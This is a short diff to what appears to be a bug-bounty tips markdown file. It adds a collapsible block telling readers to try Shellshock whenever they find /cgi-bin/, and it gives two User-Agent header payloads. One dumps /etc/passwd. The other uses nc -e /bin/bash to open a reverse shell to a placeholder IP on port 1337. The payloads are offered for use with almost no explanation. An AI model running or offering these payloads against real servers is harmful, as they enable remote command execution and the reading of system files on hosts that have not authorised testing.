@@ -84,7 +84,22 @@
 
 <img width="725" height="647" alt="image" src="https://github.com/user-attachments/assets/4fa120bb-5088-4a63-b9ee-8083347f01ef" />
 
+<details>
 
+```
+#hashtag#bugbountytips 
+when you find /cgi-bin/
+always try shellshock
+Test on CGI (cgi-bin)
+
+User-Agent: () { :;}; echo $(</etc/passwd)
+or 
+
+User-Agent: () { :;}; /usr/bin/nc ip 1337 -e /bin/bash
+```
+
+ 
+</details>
 
 
 ---
